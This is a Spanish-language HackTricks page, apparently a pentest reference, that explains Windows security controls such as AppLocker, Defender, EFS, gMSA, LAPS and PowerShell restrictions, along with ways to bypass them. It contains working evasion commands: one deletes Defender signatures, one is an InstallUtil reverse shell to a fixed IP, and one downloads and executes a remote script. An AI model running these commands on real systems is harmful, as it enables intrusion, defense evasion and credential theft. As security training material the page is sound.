# Controles de Seguridad de Windows

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
¡Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software aprobadas o ejecutables que se permiten estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno de malware dañino y software no aprobado que no se alinea con las necesidades comerciales específicas de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de lista blanca de aplicaciones** de Microsoft y brinda a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona **control granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto puede ser eludido**.

### Verificación

Verifica qué archivos/extensiones están en la lista negra/lista blanca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Este camino de registro contiene las configuraciones y políticas aplicadas por AppLocker, proporcionando una forma de revisar el conjunto actual de reglas aplicadas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Bypass

* Carpetas **escribibles** útiles para evitar la Política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **evitar esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Comúnmente, los binarios **confiables** de [**"LOLBAS's"**](https://lolbas-project.github.io/) también pueden ser útiles para evadir AppLocker.
* Las reglas **mal escritas también podrían ser evadidas**.
* Por ejemplo, con la regla **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y será permitida.
* Las organizaciones a menudo se centran en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero olvidan los **otros** [**ubicaciones ejecutables de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
* La **aplicación de DLL muy raramente está habilitada** debido a la carga adicional que puede poner en un sistema y la cantidad de pruebas requeridas para garantizar que nada se rompa. Por lo tanto, usar **DLLs como puertas traseras ayudará a evadir AppLocker**.
* Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código Powershell** en cualquier proceso y evadir AppLocker. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Almacenamiento de Credenciales

### Administrador de Cuentas de Seguridad (SAM)

Las credenciales locales están presentes en este archivo, las contraseñas están hasheadas.

### Autoridad de Seguridad Local (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema por razones de Inicio de Sesión Único.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de usuarios...), **autenticación**, **tokens de acceso**...\
LSA será el encargado de **verificar** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y **comunicarse** con el **controlador de dominio** para autenticar a un usuario de dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM, contraseñas fácilmente descifrables.

### Secretos de LSA

LSA podría guardar en disco algunas credenciales:

* Contraseña de la cuenta de equipo del Directorio Activo (controlador de dominio inaccesible).
* Contraseñas de las cuentas de servicios de Windows.
* Contraseñas de tareas programadas.
* Más (contraseña de aplicaciones IIS...).

### NTDS.dit

Es la base de datos del Directorio Activo. Solo está presente en Controladores de Dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) es un Antivirus que está disponible en Windows 10 y Windows 11, y en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, existen formas de **evadir estas protecciones**.

### Verificación

Para verificar el **estado** de **Defender**, puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (verifica el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo también podrías ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de Archivos Encriptados (EFS)

EFS asegura archivos mediante encriptación, utilizando una **clave simétrica** conocida como **Clave de Encriptación de Archivos (FEK)**. Esta clave se encripta con la **clave pública** del usuario y se almacena dentro de la **secuencia de datos alternativa** $EFS del archivo encriptado. Cuando se necesita desencriptar, se utiliza la **clave privada** correspondiente del certificado digital del usuario para desencriptar la FEK de la secuencia $EFS. Se pueden encontrar más detalles [aquí](https://en.wikipedia.org/wiki/Encrypting_File_System).

Los **escenarios de desencriptación sin iniciativa del usuario** incluyen:

- Cuando los archivos o carpetas se mueven a un sistema de archivos no EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se desencriptan automáticamente.
- Los archivos encriptados enviados a través de la red mediante el protocolo SMB/CIFS se desencriptan antes de la transmisión.

Este método de encriptación permite el **acceso transparente** a los archivos encriptados para el propietario. Sin embargo, simplemente cambiar la contraseña del propietario e iniciar sesión no permitirá la desencriptación.

**Puntos clave**:
- EFS utiliza una FEK simétrica, encriptada con la clave pública del usuario.
- La desencriptación emplea la clave privada del usuario para acceder a la FEK.
- La desencriptación automática ocurre bajo condiciones específicas, como copiar a FAT32 o transmisión en red.
- Los archivos encriptados son accesibles para el propietario sin pasos adicionales.

### Verificar información de EFS

Verifique si un **usuario** ha **utilizado** este **servicio** verificando si esta ruta existe: `C:\users\<nombredeusuario>\appdata\roaming\Microsoft\Protect`

Verifique **quién** tiene **acceso** al archivo usando cipher /c \<archivo>\
También puede usar `cipher /e` y `cipher /d` dentro de una carpeta para **encriptar** y **desencriptar** todos los archivos.

### Desencriptar archivos EFS

#### Siendo Autoridad del Sistema

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** dentro del host. En ese caso, utilizando sesiones `meterpreter`, puede suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). O simplemente puede `migrar` al proceso del usuario.

#### Conociendo la contraseña de los usuarios

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Cuentas de Servicio Administradas por Grupo (gMSA)

Microsoft desarrolló las **Cuentas de Servicio Administradas por Grupo (gMSA)** para simplificar la gestión de cuentas de servicio en infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales que a menudo tienen la configuración de "**Contraseña que nunca expira**" habilitada, las gMSAs ofrecen una solución más segura y manejable:

- **Gestión Automática de Contraseñas**: Las gMSAs utilizan una contraseña compleja de 240 caracteres que cambia automáticamente según la política del dominio o del equipo. Este proceso es manejado por el Servicio de Distribución de Claves (KDC) de Microsoft, eliminando la necesidad de actualizaciones manuales de contraseñas.
- **Seguridad Mejorada**: Estas cuentas son inmunes a bloqueos y no pueden utilizarse para inicios de sesión interactivos, mejorando su seguridad.
- **Soporte para Múltiples Hosts**: Las gMSAs pueden compartirse en varios hosts, lo que las hace ideales para servicios que se ejecutan en múltiples servidores.
- **Capacidad de Tareas Programadas**: A diferencia de las cuentas de servicio administradas, las gMSAs admiten la ejecución de tareas programadas.
- **Gestión Simplificada de SPN**: El sistema actualiza automáticamente el Nombre Principal de Servicio (SPN) cuando hay cambios en los detalles sAMaccount del equipo o en el nombre DNS, simplificando la gestión de SPN.

Las contraseñas de las gMSAs se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y se restablecen automáticamente cada 30 días por los Controladores de Dominio (DCs). Esta contraseña, un bloque de datos encriptados conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperado por administradores autorizados y los servidores en los que se instalan las gMSAs, asegurando un entorno seguro. Para acceder a esta información, se requiere una conexión segura como LDAPS, o la conexión debe autenticarse con 'Sellado y Seguridad'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Puede leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
**[Encuentra más información en esta publicación](https://cube0x0.github.io/Relaying-for-gMSA/)**

También, revisa esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un ataque de **retransmisión NTLM** para **leer** la **contraseña** de **gMSA**.

## LAPS

La **Solución de Contraseña de Administrador Local (LAPS)**, disponible para descargar desde [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite la gestión de contraseñas de administrador local. Estas contraseñas, que son **aleatorias**, únicas y **cambiadas regularmente**, se almacenan de forma centralizada en Active Directory. El acceso a estas contraseñas está restringido a través de ACLs para usuarios autorizados. Con los permisos suficientes otorgados, se proporciona la capacidad de leer las contraseñas de administrador local.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Lenguaje Restringido de PS

El [**Modo de Lenguaje Restringido de PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para utilizar PowerShell de manera efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.

### **Verificar**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Saltar
```powershell
#Easy bypass
Powershell -version 2
```
En la versión actual de Windows, ese Bypass no funcionará, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, es posible que necesites** **agregar una referencia** -> _Examinar_ -> _Examinar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversa:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código Powershell** en cualquier proceso y evadir el modo restringido. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de Ejecución de PS

Por defecto está configurada como **restrictiva.** Principales formas de evadir esta política:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Puedes encontrar más información [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfaz de Proveedor de Soporte de Seguridad (SSPI)

Es la API que se puede utilizar para autenticar usuarios.

El SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que desean comunicarse. El método preferido para esto es Kerberos. Luego, el SSPI negociará qué protocolo de autenticación se utilizará, estos protocolos de autenticación se llaman Proveedor de Soporte de Seguridad (SSP), se encuentran dentro de cada máquina Windows en forma de una DLL y ambas máquinas deben admitir el mismo para poder comunicarse.

### Principales SSPs

* **Kerberos**: El preferido
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** y **NTLMv2**: Razones de compatibilidad
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web y LDAP, contraseña en forma de hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL y TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Se utiliza para negociar el protocolo a utilizar (Kerberos o NTLM siendo Kerberos el predeterminado)
* %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de Cuenta de Usuario

[Control de Cuenta de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita una **solicitud de consentimiento para actividades elevadas**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
